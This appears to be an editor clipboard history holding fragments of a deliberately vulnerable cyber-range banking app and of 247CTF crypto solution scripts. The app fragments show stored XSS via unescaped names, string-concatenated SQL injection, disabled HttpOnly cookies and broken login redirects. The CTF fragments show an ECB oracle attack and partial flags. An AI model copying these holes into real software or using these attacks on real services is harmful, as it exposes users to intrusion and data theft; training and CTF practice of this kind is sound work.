ac2653af25a97265e151f2806d648395|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/templates/profile.html|24|1|V|html
			<ul class="nav navbar-nav navbar-right">
			  <li>
				<a href="/logout"><span class="glyphicon glyphicon-log-out"></span> Logout</a>
			  </li>
2cc7032e4fbf0634a230b1ff12585330|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/templates/profile.html|24|1|V|html
			<ul class="nav navbar-nav navbar-right">
			  <li>
				<a href="/logout"><span class="glyphicon glyphicon-log-out"></span> Logout</a>
			  </li>
			</ul>
13b2967e32933a5bf6393be0ecfa1b0f|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/search_bar.html|2|1|V|htmldjango
	<form action="#">
	    <input type="text" name="sitesearch" placeholder="Search for past transactions..."/>
	    <input type="submit" name="start_search" class="button" value="Search"/>
	</form>				
52650db96072754929febceafb1bf9fc|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/search_bar.html|7|1|V|htmldjango
	    <input type="text" name="sitesearch" placeholder="Search for past transactions..."/>
13348442cc6a27032d2b4aa28b75a5d3|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/search_bar.html|7|68|v|htmldjango
	Search
e4ba5bd6dee888fc2d2cf25533814f2a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/search_bar.html|9|1|V|htmldjango
	<ul class="nav navbar-nav navbar-right">
	  <li>
	    <a href="/logout"><span class="glyphicon glyphicon-log-out"></span> Logout</a>
	  </li>
	</ul>
2dabaf15dc6c81be6d7b36b9c1aa4242|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/search_bar.html|6|1|V|htmldjango
	<form action="/logout">
	    <input type="submit" name="start_search" class="button" value="Logout"/>
	</form>				
cbf36cf68b4b5a58763b9ee8c123aa5f|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/server.py|57|1|V|python
	        role = str(result[0][2])
	        session['role'] = role
	        session['name'] = str(result[0][3])
	        session['username'] = username
95dbfc8e6c647971d14b6dd1fe586ab2|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|55|9|V|python
	        session['username'] = username
f6039d44b29456b20f8f373155ae4973|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|86|41|v|python
	Username
f2d57c2af68d6937fd4da98d103e0955|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/templates/profile.html|58|1|V|html
	                  <input type="text" id="currentName" name="currentName" value="{{ name|safe }}" class="form-control" disabled>
813f688d2cddb71a36db15b6bfff1a12|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|88|19|V|python
	                  <input type="text" id="username" name="username" value="{{ username }}" class="form-control" disabled>
02ae976a2a573fa7a7aa07b7a4cc77ab|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/server.py|87|1|V|python
	@app.route('/admin', methods=['GET'])
	def admin():
	    if 'role' in session.keys():
	        if session['role'] == 'admin':
	            conn = sqlite3.connect('deflect.db')
	            c = conn.cursor()
	            # Execute query
	            c.execute('''SELECT username,name,email from users''')
	            result = c.fetchall()
	            conn.commit()
	            conn.close()
	            return render_template('admin.html', result=result, role=session['role'])
	    return "Nah, not today!"
20cd28ec8a4458653d8370a0e6d93e50|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|117|37|v|python
	deflect
6a5d5837208b2f0a0cbb529f2bc4abc8|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/index.html|1|1|V|htmldjango
	{% extends "layout.html" %}
	    {% block spacer %}
	        {% include "search_bar.html" %}
	    {% endblock %}
	    {% block content %}
8ed5e58af841d5346f181edcad86f365|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/templates/admin.html|32|1|V|html
		<div class="container">
		  <style>
			.panel-heading, .btn {
			background-color: {{ color }} !important;
			border-color: {{ color }} !important; 
			}
		  </style>
		  
		  <h2 style="text-align:center"><b>Admin Panel</b></h2>
	      <div class="row">
	        <div class="col-md-12">
	          <div class="panel panel-primary" style="margin-top:50px;">
	            <div class="panel-heading">
	              <h3 class="panel-title">Accounts</h3>
	            </div>
	            <div class="panel-body">
				  <table class="table table-hover">
					<thead>
					  <tr>
						<th>Username</th>
						<th>Real Name</th>
						<th>Email</th>
					  </tr>
					</thead>
					<tbody>
					  {% for username,name,email in result %}
					  <tr>
						<td>{{ username }}</td>
						<td>{{ name|safe }}</td>
						<td>{{ email }}</td>
					  </tr>
					  {% endfor %}
					</tbody>
				  </table>
				</div>
	          </div>
	        </div>
		  </div>
		</div>
461bd51ee105c23c9cd4e5f75d5e2b50|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|37|1|V|htmldjango
	                        <div class="group">
	                            <label for="email" class="label">Email Address</label>
	                            <input id="email" name="email" type="text" class="input">
	                        </div>
643a860f992333b8600ea264aca7c4fc|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|34|61|v|htmldjango
	Email Address
654c075b63d3ad8e85637dae0d627179|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/server.py|102|1|V|python
	@app.route('/changeName', methods=['POST'])
	def changeName():
	    if 'username' in session.keys():
	        user = session['username']
	    else:
	        return redirect(url_for('index'))
	
	    newName = request.form['changeName']
	
	    # Connect to db
	    conn = sqlite3.connect('deflect.db')
	    c = conn.cursor()
	    params = (newName, user)
	    c.execute('''UPDATE users SET name = ? WHERE username = ? ''', params)
	    conn.commit()
	    conn.close()
	    return redirect(url_for('profile'))
	
3c7ef08c7716e58bd7f71140f5ad9b2d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|25|6|V|htmldjango
	                <img src="/images/lock.png" height="100px" width="100px" />                
3311992b8c42cae61b4b7fc8485a1b71|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|25|17|V|htmldjango
	                <p>Your personal details are safe!</p>
716d85c152d685df1a789ad3092492d9|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/xss-1/app/templates/profile.html|65|1|V|html
			<div class="col-md-4">
	          <div class="panel panel-primary" style="margin-top:50px">
	            <div class="panel-heading">
	              <h3 class="panel-title">Change Name</h3>
	            </div>
	            <div class="panel-body">
	              <form action="/changeName" method="POST">
	                <fieldset>
	                  <div class="form-group">
	                    <label for="changeName">New Name</label>
	                    <input type="text" id="changeName" name="changeName" class="form-control">
	                  </div>
	                  <div class="form-actions">
	                    <input type="submit" value="Save" class="btn btn-primary">
	                  </div>
	                </fieldset>
	              </form>
	            </div>
	          </div>
60a849a8961ba61798a4cece34871607|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/profile.html|23|3|V|htmldjango
			<div class="col-md-4">
c7b8a1b95b5fe9f420cde0e6863b9b39|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/server.py|23|1|V|python
	# Check authentication insecure (long redirection)
	def login_required_insecure(f):
	    @wraps(f)
	    def decorated_function(*args, **kwargs):
	        if 'username' not in session.keys():
	            response = make_response()
	            response.status = '302 Found'        
	            response.headers['Location'] = url_for('index')
	            #return redirect(url_for('index'))
	        else:
	            response = None
	        return f(response)
	    return decorated_function
b124bf54b62ae3452dc8f49de70031f8|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/server.py|108|1|V|python
	@app.route('/search', methods=['GET'])
	@login_required_insecure
	def searchWeapon(response=None):
	    # Get weapon_id
	    weapon_id = request.args.get('weapon_id')
	    # Connect to db and retrieve if present
	    if weapon_id:
	        query = "SELECT name,weapon FROM weapons WHERE id="+weapon_id
	        print query
	        result = executeQuery(query)
	        print result
	        if result:
	            name = result[0][0]
	            weapon = result[0][1]
	        else:
	            name = 'No such ID'
	            weapon = ''
	        # Long redirection
	        rendered = render_template('searchWeapon.html', name=name, weapon=weapon)
	    else:
	        rendered = render_template('searchWeapon.html')
	
	    if response is None:
	        response = make_response(rendered)
	    else:
	        response.set_data(rendered)
	    return response
8ab39a116c68d0b1ac8795d2d7c0fb76|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/search_bar.html|6|30|v|htmldjango
	sitesearch
18c83669920215a818638ad0e5421e4b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|203|11|v|python
	Weapon
ea647352c37cbf1ada22843e712b5b72|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|205|5|v|python
	weapon_id
282aa351a2bd30655fbc060bd4f33766|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|208|35|v|python
	weapon
b27a803ed346fbbf6d2e2eb88df1c51b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|208|55|v|python
	weapons
949b803f073fe8d6ebb5a801d438ea12|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|208|87|v|python
	eapon_id
07b4d5d7da2f5fcc05fbfde54cd86af9|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|213|13|v|python
	frwom
099cb3b702d9c37cb144468aa8bd5cb5|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|216|24|v|python
	No such ID
4be4a4ed6e77d5e0c191d5c225a033f7|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|218|9|V|python
	        # Long redirection
a3d5c1c6aef2fa00bd75129986b87d31|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|218|37|v|python
	searchWeapon
853d384416d0f24a1d4a08b66a8ed652|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/server.py|49|1|V|python
	def executeQuery(query, params=None):
	    # Connect to db
	    conn = sqlite3.connect('deflect.db')
	    c = conn.cursor()
	
	    # Optionally set parameters
	    if params is None:
	        c.execute(query)
	    else:
	        c.execute(query, params)
	    result = c.fetchall()
	    
	    # Close db
	    conn.commit()
	    conn.close()
	
	    # return results
	    return result
88075796bdc95a60da6407adbbf5969b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|27|13|V|python
	            #return redirect(url_for('index'))
271c474fad29547113861857f959da9a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|19|24|v|python
	insecure (long redirection)
3c76f15e3b2f617b6855ef70528f62ca|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|218|16|v|python
	_insecure
394e5a3a3e850d72002abe12015f1246|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|232|13|V|python
	            to_user = ''
9489c7a380e55dbdbfebbc84adf0636c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|232|13|V|python
	            amount = ''
0c423c15d756d3b16a44ba7baa010d3d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|231|13|V|python
	        else:
	            result = ''
e9c08160a3834881bb23c19c4c71333c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|75|1|V|python
	    result = c.fetchall()
	    conn.commit()
	    conn.close()
80c1d82c1d814c27f5668c6c0f13c023|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|70|5|V|python
	    c = conn.cursor()
6e2b89bec16269c7af696e84be26af4b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|68|5|V|python
	    # Connect to db
	    conn = sqlite3.connect('treasure.db')
ba97ac244502558e4a8cf62febee8e70|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|68|5|V|python
	    # Set parameters for query
072078d67423a44cca5d3f070a65192b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|222|18|V|python
	            to_user = result[0][0]
	            amount = result[0][1]
1afc440cb206d83b9a96dc888e68e9fe|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|223|1|V|python
	    else:
	        rendered = render_template('searchWeapon.html')
508f7fc2a13218d5b0fac5595345a27a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|221|1|V|python
	        if result:
833ede6c441c413a9608f2c40b5cf279|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|220|9|V|python
	        # print result
e1fc7ab6673c3fcb9697f593f8c5532b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|218|9|V|python
	        # print query
c06f55f2b125b114bd90551239140cbe|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|139|14|V|python
	            conn = sqlite3.connect('treasure.db')
	            c = conn.cursor()
a2315a9340f6fce55e631df906fb07d7|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|141|13|V|python
	            result = c.fetchall()
9d6dcb876cdaafcce2ec6fc0a32d5818|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|141|13|V|python
	            conn.commit()
6e722391d0f32f91952fec59b57e8bd4|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|141|13|V|python
	            conn.close()
0d02c51e265698e7f113538e8be648e1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|214|57|v|python
	from_user=from_user, to_user=to_user, amount=amount
a00c1afc8c7645bf367cee59654569ec|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/admin.html|1|1|V|htmldjango
	{% extends "layout.html" %}
	    {% block spacer %}
	        {% include "search_bar.html" %}
	    {% endblock %}
	    {% block content %}
		<div class="container">
		  <style>
			.panel-heading, .btn {
			background-color: {{ color }} !important;
			border-color: {{ color }} !important; 
			}
		  </style>
		  
		  <h2 style="text-align:center"><b>Admin Panel</b></h2>
	      <div class="row">
	        <div class="col-md-12">
	          <div class="panel panel-primary" style="margin-top:50px;">
	            <div class="panel-heading">
	              <h3 class="panel-title">Accounts</h3>
	            </div>
	            <div class="panel-body">
				  <table class="table table-hover">
					<thead>
					  <tr>
						<th>Username</th>
						<th>Real Name</th>
						<th>Email</th>
					  </tr>
					</thead>
					<tbody>
					  {% for username,name,email in result %}
					  <tr>
						<td>{{ username }}</td>
						<td>{{ name|safe }}</td>
						<td>{{ email }}</td>
					  </tr>
					  {% endfor %}
					</tbody>
				  </table>
				</div>
	          </div>
	        </div>
		  </div>
		</div>
	    {% endblock %}
31d0a5cced09c66b11bcc9cc171922de|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/transactions.html|25|6|V|html
						<th>Username</th>
a0e0d3f0c6b4b4368519cb9b036b95f8|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/transactions.html|14|37|v|html
	Admin Panel
43c20b3892e69757b9875076f0d1c1c1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/transactions.html|18|1|V|html
	            <div class="panel-heading">
	              <h3 class="panel-title">Accounts</h3>
	            </div>
ce8ae9da5b7cd6c3df2929543a9af92d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/transactions.html|23|10|v|html
	Email
131712ade558b88add016eb15caa03e0|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/transactions.html|27|14|v|html
	username,name,email 
7a42cc55d66a74c47491c0b165ca294b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/transactions.html|29|6|V|html
						<td>{{ username }}</td>
a661d0cfad0083db5c1e9f0ff02cd951|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|215|18|V|python
	    if not result:
	        result = ''
e7252f032ede16096f53375f3875d4bd|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|208|5|V|python
	    # Get weapon_id
865a872f1fd89071910a4de812985945|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/server.py|11|1|V|python
	SESSION_COOKIE_HTTPONLY = False #disable httpOnly
a337c001bea218b4b14c952f84c07087|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|13|33|v|python
	#disable httpOnly
ff858fa95ae01f317cc5ec9af2aaca38|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|86|1|V|python
	        # Connect to db
	        conn = sqlite3.connect('treasure.db')
	        c = conn.cursor()
	        # Set parameters for query
7e6d22097abae0f5fe15034986b0e9b4|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|89|9|V|python
	        result = c.fetchall()
8fd9f2642c294ba7f181b9d7de68c769|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|89|9|V|python
	        conn.commit()
e146a036ddec3867c1f4b4ea301f5ae9|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|89|9|V|python
	        conn.close()
5b48e57d1de01d5b2859cf18980beca4|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|216|1|V|python
	@login_required
8ee1aa34c1795c13a7f91e44f12aea53|file:///home/neo/247ctf/crypto/sol_impossible.py|5|50|v|python
	https://aes.cryptohack.org/symmetry/encrypt/'
d35f17ba9b7397090311014b2093a79d|file:///home/neo/247ctf/crypto/sol_impossible.py|6|13|v|python
	https://aes.cryptohack.org/symmetry/encrypt_flag/'
18095f30b9c63cb5b6807c408ab3817c|file:///home/neo/247ctf/crypto/impossible.py|8|1|V|python
	flag_user = 'impossible_flag_user'
93486adf0984aa3261eaadbfa5b5cc8f|file:///home/neo/247ctf/crypto/sol_impossible.py|3|1|V|python
	import sys, string, binascii, requests
e51bc8169ea631c47448910bfc1dece3|file:///home/neo/247ctf/crypto/sol_impossible.py|11|5|V|python
	    request.args['user'] = fake_user
123109da800b6b4723a6bcaf0f8784f4|file:///home/neo/247ctf/crypto/sol_impossible.py|2|1|V|python
	from flask import request
033ab2f35fa309c3395d5f7efefbe88d|file:///home/neo/247ctf/crypto/sol_impossible.py|11|5|V|python
	    print(fake_user.hex())
0763dcec0f9e22f653a1caf21f4f6490|file:///home/neo/247ctf/crypto/sol_impossible.py|13|5|V|python
	    print(encrypted_user)
ee2dbe9525a9d725ec3d8007d3992853|file:///home/neo/247ctf/crypto/sol_impossible.py|13|5|V|python
	    print(len(encrypted_user))
bf3ee23c8a25b7e699daf78f8a7220fb|file:///home/neo/247ctf/crypto/sol_exclusive.py|8|1|V|python
	known = b'247CTF{'
b3127eab28392a85a3d65b90c7a261d4|file:///home/neo/247ctf/crypto/sol_exclusive.py|9|11|v|python
	247CTF{
a51a3531749ab02b87f8b1e26363e73f|file:///home/neo/247ctf/crypto/sol_exclusive.py|18|5|V|python
	    if b'247CTF{' in key:
edf4c33e4be31abb7f80cbd673f8f8b9|file:///home/neo/247ctf/crypto/sol_exclusive.py|9|11|v|python
	interwikipedia
a9fd53d62791fab19d82db1e2445fa1f|file:///home/neo/247ctf/crypto/sol_exclusive.py|9|1|V|python
	known = b'trademark'
202995b2076b211d02ff9c187e6bac2b|file:///home/neo/247ctf/crypto/sol_exclusive.py|15|22|v|python
	knwown
a86aaa832a26b086b3d75e72865a9ffb|file:///home/neo/247ctf/crypto/sol_exclusive.py|17|13|V|python
	            cands.append(c)
2a94e3d5cb3be48257080ec162f73284|file:///home/neo/247ctf/crypto/sol_exclusive.py|15|1|V|python
	for i in range(len(data)):
12672e79b01e9ca7018105efb0ef871c|file:///home/neo/247ctf/crypto/sol_exclusive.py|9|8|v|python
	wikipedia
2019ac62a4ef2dedc506ad4db79dc348|file:///home/neo/247ctf/crypto/sol_exclusive.py|9|8|v|python
	interlanguage
1e9ff7e928a03eb158baed090dccaa40|file:///home/neo/247ctf/crypto/sol_exclusive.py|9|8|v|python
	PageContentMobile
51cf709932e3a0f709449e1498eb9160|file:///home/neo/247ctf/crypto/sol_exclusive.py|9|8|v|python
	efunctioncounter
f9ac4feeb4b1d94f3146fc6b3207e6de|file:///home/neo/247ctf/crypto/sol_exclusive.py|9|8|v|python
	ecentchangeslinke
9f299d717e1fc6ca39912b3a7f467412|file:///home/neo/247ctf/crypto/sol_exclusive.py|9|1|V|python
	pt = b'RecentChangesLinke'
58befbaabdbc6abdcddbe9fa6cc28bfb|file:///home/neo/247ctf/crypto/sol_exclusive.py|8|1|V|python
	known = b'247CTF{cb82a21bb9c'
abb66c2e4c664163733e4e995d08c2c1|file:///home/neo/247ctf/crypto/sol_exclusive.py|9|1|V|python
	# pt = b'aViewerEnabledByDefault'
d20c3e067c99ea85d41a08b7cc5312e9|file:///home/neo/247ctf/crypto/sol_exclusive.py|8|1|V|python
	known = b'247CTF{cb82a21bb9c4654e'
958e07d2a848c3b92aeb3d00fc73451d|file:///home/neo/247ctf/crypto/sol_exclusive.py|27|10|v|python
	isalnum
4456a13326fca4c0b2b5fc61b6ed24c9|file:///home/neo/247ctf/crypto/sol_exclusive.py|32|1|V|python
	# for key in cands:
	#     print(key)
4688f21ecc1b338a35ad8a71ec273817|file:///home/neo/247ctf/crypto/sol_exclusive.py|16|14|v|python
	string.ascii_letters + string.digits:
a4adecc65a434e37b43df9e228b110a5|file:///home/neo/247ctf/crypto/sol_exclusive.py|9|1|V|python
	pt = b'DisplayWikibaseDescriptions'
eda79f2762b9275a02c19995d96e79a9|file:///home/neo/247ctf/crypto/sol_exclusive.py|9|1|V|python
	pt = b'push(function(){mw.config.get({"'
0cec121e4699a5d6def78d090efea3c2|file:///home/neo/247ctf/crypto/sol_exclusive.py|8|1|V|python
	known = b'247CTF{cb82a21bb9c4654e1953'
1c62d3ba9653299473f3ddd119335fca|file:///home/neo/247ctf/crypto/exclusive.dec|3|1|V|html
	<head>
	<m6w4yd=7nset="UTF-8"/>
	<title>Hacker - Wi8j%<c<7 /title>
90ae8eab7d19187bad60e1c0b2afd8e3|file:///home/neo/247ctf/crypto/sol_exclusive.py|11|1|V|python
	pt = b'"});});</script>\n</body>\n</html>'
57a3bd86eecc7462f728ca15f62aaad6|file:///home/neo/247ctf/crypto/sol_exclusive.py|11|59|v|python
	Wi8j%<c<7 /title>
179851a15d456bce720d6c076e91102d|file:///home/neo/247ctf/crypto/exclusive.dec|2|27|v|html
	lang="en" dir="ltr">
a1193946e687de561ec7971741f292d4|file:///home/neo/247ctf/crypto/sol_exclusive.py|9|1|V|python
	known = b'247CTF{cb82a21bb9c4654e19536ccec'
04f644d1e6160c9865e7eff2591e7ec1|file:///home/neo/247ctf/crypto/sol_exclusive.py|10|18|v|python
	cb82a21bb9c4654e19536ccec'
833c916227fd4a6990beb04f05d825c8|file:///home/neo/247ctf/crypto/sol_exclusive.py|24|19|V|python
	        if k[:3] == b'lan':
	            print(k)
6c53943b4c1633e92319e9ffd57d98e3|file:///home/neo/247ctf/crypto/sol_exclusive.py|22|5|V|python
	    for c in string.printable:
6a2d39f32d6c609d405e916104292657|file:///home/neo/247ctf/crypto/sol_exclusive.py|24|10|V|python
	        if k[:5] == b'lang=':
	            print(c, k)
5c8bcea35e26c5827fc5bc6cd86e906e|file:///home/neo/247ctf/crypto/exclusive.dec|1|1|^v|html
	<!DOCTYPE html>
	<html class="cli6m!ti:<o"
506fadc08bd039cb6138dbaefee0e226|file:///home/neo/247ctf/crypto/sol_exclusive.py|24|21|V|python
	        if k[:8] == b'o" lang=':
	            print(c, k)
01116e2f072c2a361a6332e0d57fbb11|file:///home/neo/247ctf/crypto/sol_exclusive.py|23|9|V|python
	        print(len(test))
d61a32bb88cfa2a90727dc988fa9eacd|file:///home/neo/247ctf/crypto/sol_exclusive.py|24|21|V|python
	        if k[:7] == b'o" lang':
	            print(c, k)
af45042130d130d618e0cf91f1651119|file:///home/neo/247ctf/crypto/sol_exclusive.py|9|1|V|python
	known = b'247CTF{cb83a21bb9c4654e19536ccec'
390333070d6524577322ca1029338818|file:///home/neo/247ctf/crypto/sol_exclusive.py|11|1|V|python
	# known = b'247CTF{'
87e7014a5f27687af79a5eb0bc71ab9d|file:///home/neo/247ctf/crypto/sol_exclusive.py|10|24|v|python
	1bb9c4654e19536ccec'
8555bf67a4509df419b76d782fe508c5|file:///home/neo/247ctf/crypto/sol_exclusive.py|10|1|V|python
	known = b'247CTF{cb83a2'
df7fceb91692559b1e10de72df562410|file:///home/neo/247ctf/crypto/sol_exclusive.py|16|1|V|python
	pt = b"""o" lang="en" dir="ltr">\n<head>\n<meta charset="UTF-8"/>\n<title>Hacker"""
a2de6b4218d6587c2482abcd9922d51b|file:///home/neo/247ctf/crypto/sol_impossible.py|1|1|V|python
	#!/usr/share/python3
	import requests
	
	URL_BASE = 'https://dfd9ce935a10a5bf.247ctf.com/'
	URL_ENCRYPT = URL_BASE + 'encrypt'
	URL_GETFLAG = URL_BASE + 'get_flag'
	flag_user = b'impossible_flag_user'
	
	if __name__=='__main__':
	    fake_user = b'a' * 16 + flag_user
	    fake_user = fake_user.hex()
	    encrypted_user = requests.get(url=URL_ENCRYPT + '?user=' + fake_user).text[32:]
4287609e92491d4e42b511d83c7a26f4|file:///home/neo/247ctf/crypto/sol_hidden.py|4|1|V|python
	URL_BASE = 'https://dfd9ce935a10a5bf.247ctf.com/'
00a027370b8f9bb3a017b1066ddee774|file:///home/neo/247ctf/crypto/sol_hidden.py|5|34|V|python
	URL_ENCRYPT = URL_BASE + 'encrypt'
	URL_GETFLAG = URL_BASE + 'get_flag'
1e53271823661d39d1bf9f23344a623d|file:///home/neo/247ctf/crypto/sol_hidden.py|5|1|V|python
	flag_user = b'impossible_flag_user'
2cde670884b706038e4427c08d11f972|file:///home/neo/247ctf/crypto/sol_hidden.py|9|37|V|python
	    fake_user = b'a' * 16 + flag_user
	    fake_user = fake_user.hex()
b88d1a7b64de4436e98f01de5ddb6f2b|file:///home/neo/247ctf/crypto/sol_hidden.py|13|26|v|python
	requests.get(url=URL_ENCRYPT + '?user=' + fake_user).text[32:]
e04d9ea7a205f00be7c46c0a877a9cca|file:///home/neo/247ctf/crypto/sol_hidden.py|12|81|v|python
	[32:]
586497ba475482a23e416bddaa58b10e|file:///home/neo/247ctf/crypto/sol_hidden.py|12|52|v|python
	_ENCRYPT
895bb17e6aa527a4e9607642fa804570|file:///home/neo/247ctf/crypto/sol_hidden.py|13|91|v|python
	[targ_block * block_size: targ_block * block_size + block_size]
31a4d6bdfecfe2a5b6e3e425edf7d90d|file:///home/neo/247ctf/crypto/sol_hidden.py|15|9|V|python
	        encrypted_user = requests.get(url=URL_ENCRYPT + '?user=' + fake_user).text[32:]
3480f45e73ede4e7c3dbce842ccba3d2|file:///home/neo/247ctf/crypto/sol_hidden.py|13|21|v|python
	bytes.fromhex(requests.get(url=URL + '?plaintext=' + fake_block).text)
bf0c6c795250d39b2981cf2c866724e2|file:///home/neo/247ctf/crypto/sol_hidden.py|14|18|v|python
	encrypted[targ_block * block_size: targ_block * block_size + block_size]
933cba3746f11a14a3c28c3077ef2650|file:///home/neo/247ctf/crypto/sol_hidden.py|16|97|v|python
	.encode()
114f2f41e03f188c176d7092bba93f54|file:///home/neo/247ctf/crypto/sol_hidden.py|15|98|^v|python
	.encode().hex().encode())
4cc3a87e68f22f1cf8921ee1f92f39f6|file:///home/neo/247ctf/crypto/sol_hidden.py|10|36|v|python
	encode()
07328b7a228b3a91db8151294f76a2a7|file:///home/neo/247ctf/crypto/sol_hidden.py|11|5|V|python
	    fake_block = 'a' * (block_size * 3 - 1)
7930755b341bb8ebe5e791a83a68c06b|file:///home/neo/247ctf/crypto/sol_hidden.py|11|5|V|python
	    flag_hex = bytes(flag, 'utf-8').hex()
	    fake_block_hex = bytes(fake_block, 'utf-8').hex()
c7539a9300f913d2c29df2759ef040aa|file:///home/neo/247ctf/crypto/sol_hidden.py|18|94|v|python
	.hex().encode()
dbe216503b458ee4c8632af5432cb799|file:///home/neo/247ctf/crypto/sol_hidden.py|18|101|v|python
	c.encode(
6e2a934fb5b677afe426d1af5648d8ae|file:///home/neo/247ctf/crypto/sol_hidden.py|18|13|V|python
	            c = chr(ord(c))
7e4af245aa8ff7c30dfecae95e3a9ad3|file:///home/neo/247ctf/crypto/sol_hidden.py|14|9|V|python
	        print(fake_block_hex)
5a003b799f541e4c82abef7cd5bbe203|file:///home/neo/247ctf/crypto/sol_hidden.py|18|44|v|python
	requests.get(url=URL + b'?plaintext=' + fake_block_hex.encode() + flag_hex.encode() + hex(ord(c)).encode()).text
3332f05eaeadc7b337b5c5763235b687|file:///home/neo/247ctf/crypto/sol_hidden.py|18|19|v|python
	requests.get(url
4df18a811998661bb0d43b9bf4fb5c5f|file:///home/neo/247ctf/crypto/sol_hidden.py|18|13|V|python
	            print(fake_block_hex.encode() + flag_hex.encode() + hex(ord(c)).encode())
516d587704ab174657e28a7b19a8bcb8|file:///home/neo/247ctf/crypto/sol_hidden.py|15|9|V|python
	        print(fake_block + flag)
3e281f1ab362cfa27a65dd35522c6491|file:///home/neo/247ctf/crypto/sol_hidden.py|15|99|v|python
	+ flag_hex.encode()
20791e58d0c627c5626b35657bfb116d|file:///home/neo/247ctf/crypto/sol_hidden.py|14|1|V|python
	        targ_block = 2 - (i // block_size)
9e4e66c1c06e70fad4318fc0eacfae65|file:///home/neo/247ctf/crypto/sol_hidden.py|15|24|v|python
	- (i // block_size)
fa9b0c1604136e188842d6dee2bcc2db|file:///home/neo/247ctf/crypto/sol_hidden.py|15|9|V|python
	        targ_block = 2 
65a1ec58ee1b5b2fba7153c3d5fcb50e|file:///home/neo/247ctf/crypto/sol_hidden.py|14|1|V|python
	        targ_block = 2 - ((i+1) // block_size)
bc09e2bd898ca925c80a73e7b46cfb64|file:///home/neo/247ctf/crypto/sol_hidden.py|15|23|v|python
